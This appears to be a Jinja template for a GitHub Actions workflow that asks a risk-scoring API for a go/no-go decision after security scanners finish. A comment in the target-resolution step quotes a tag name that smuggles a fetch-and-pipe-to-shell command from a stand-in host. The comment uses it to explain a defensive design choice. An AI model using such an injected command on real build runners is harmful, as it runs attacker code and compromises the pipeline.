{#-
  Oracle gate — spec 09 §8.

  The only capability template that does not extend _base.yml.j2, because it
  is not a scanner: it runs no tool, produces no findings, and uploads
  nothing. It asks Mykronos for a decision about work the scanners have
  already reported.

  Triggered by `workflow_run` rather than `pull_request` so it starts *after*
  the scanners have finished and their findings are in the lake. Running on
  `pull_request` would race them and score a commit whose scans had not
  landed — producing a confident "go" against an empty lake, which is the
  worst available failure for a risk gate.

  The cost of `workflow_run` is that this workflow runs in the context of the
  default branch, not the pull request, so everything about the PR comes out
  of the event payload rather than the checkout.

  NOTE ON SHELL SYNTAX: no heredocs in these templates. Jinja's variable
  delimiter here is `<<`, so `cat <<JSON` parses as the start of a Jinja
  expression and the template fails to compile. Build strings with `printf`
  or `jq -n` instead — both are on every GitHub runner.
-#}
# Generated by Mykronos Workflow Installer — template version: << template_version >>
# Capability: oracle · Repo: << repo_full_name >>
#
# Do not edit by hand. A template resync will overwrite this file (spec 03 §6).

name: Mykronos oracle

on:
  workflow_run:
    # Every scanner whose findings must be in the lake before a decision is
    # made. The installer renders only the capabilities this repo has enabled,
    # so the gate never waits on a workflow that will not run — a workflow_run
    # trigger naming a workflow that does not exist simply never fires, and
    # the gate would silently stop producing decisions.
    workflows:
{%- for workflow in gate_depends_on %}
      - "<< workflow >>"
{%- endfor %}
    types: [completed]
  release:
    types: [published]
  workflow_dispatch:

permissions:
  contents: read
  # Publishing the decision as a Check Run is the point (spec 09 §8).
  checks: write

concurrency:
  # Keyed on the commit rather than the branch: two scanners finishing at
  # nearly the same time must not produce two decisions for the same code.
  group: mykronos-oracle-${{ github.event.workflow_run.head_sha || github.sha }}
  cancel-in-progress: false

jobs:
  decide:
    name: Risk decision
    runs-on: ubuntu-latest
    timeout-minutes: 10

    steps:
      - name: Resolve what is being judged
        id: target
        # workflow_run fires for pushes as well as pull requests, and carries
        # its own head_sha rather than the checked-out one.
        env:
          # A tag name is the field here that is genuinely dangerous. Git
          # allows `;`, `$` and `&` in a ref, so `v1.0;curl evil.sh|sh` is a
          # legal tag - and interpolated into this script it would run on the
          # runner. Bound to env it is only ever a string.
          EVENT_NAME: ${{ github.event_name }}
          PUSH_SHA: ${{ github.sha }}
          RELEASE_TAG: ${{ github.event.release.tag_name }}
          RUN_SHA: ${{ github.event.workflow_run.head_sha || github.sha }}
          RUN_PR: ${{ github.event.workflow_run.pull_requests[0].number || 0 }}
        run: |
          set -euo pipefail
          if [ "$EVENT_NAME" = "release" ]; then
            {
              echo "kind=release_gate"
              echo "sha=$PUSH_SHA"
              echo "tag=$RELEASE_TAG"
              echo "pr=0"
            } >> "$GITHUB_OUTPUT"
          else
            SHA="$RUN_SHA"
            PR="$RUN_PR"
            if [ "$PR" != "0" ]; then
              KIND=pr_gate
            else
              # A push to the default branch with no PR attached. Still worth
              # a decision — it is what the portfolio view reflects.
              KIND=portfolio
            fi
            {
              echo "kind=$KIND"
              echo "sha=$SHA"
              echo "pr=$PR"
              echo "tag="
            } >> "$GITHUB_OUTPUT"
          fi

      - name: Ask Oracle for a decision
        env:
          TOKEN: ${{ secrets.<< token_secret_name >> }}
          KIND: ${{ steps.target.outputs.kind }}
          SHA: ${{ steps.target.outputs.sha }}
          PR: ${{ steps.target.outputs.pr }}
          TAG: ${{ steps.target.outputs.tag }}
        run: |
          set -euo pipefail

          # jq builds the body so a branch name with a quote in it cannot
          # break out of the JSON.
          BODY=$(jq -nc \
            --arg kind "$KIND" --arg sha "$SHA" --arg tag "$TAG" --argjson pr "$PR" \
            '{decision_type: $kind, commit_sha: $sha, pr_number: $pr, release_tag: $tag}')

          curl --fail --silent --show-error --max-time 60 \
            -X POST "<< ingestion_api_url >>/api/oracle/evaluate" \
            -H "Authorization: Bearer $TOKEN" \
            -H "Content-Type: application/json" \
            -d "$BODY" > decision.json

          SCORE=$(jq -r '.overall_risk_score' decision.json)
          REC=$(jq -r '.recommendation' decision.json)
          REASON=$(jq -r '.reasoning' decision.json)
          BLOCKING=$(jq -r '.blocking' decision.json)
          CHECK_ERROR=$(jq -r '.check_run_error // empty' decision.json)

          echo "Oracle: $REC at $SCORE/100"
          echo "$REASON"

          {
            echo "## Mykronos Oracle — $REC ($SCORE/100)"
            echo
            echo "$REASON"
          } >> "$GITHUB_STEP_SUMMARY"

          if [ -n "$CHECK_ERROR" ]; then
            # The decision is recorded either way; only its display failed.
            echo "::warning::Decision recorded, but the check run could not be posted: $CHECK_ERROR"
          fi

          # Advisory unless this repo opted into blocking (spec 09 §6). Even
          # then the Check Run is what gates the merge — failing this step as
          # well would just be a second red mark saying the same thing.
          if [ "$BLOCKING" = "true" ] && [ "$REC" = "no_go" ]; then
            echo "::error::Oracle returned no_go and blocking is enabled for this repository."
            exit 1
          fi
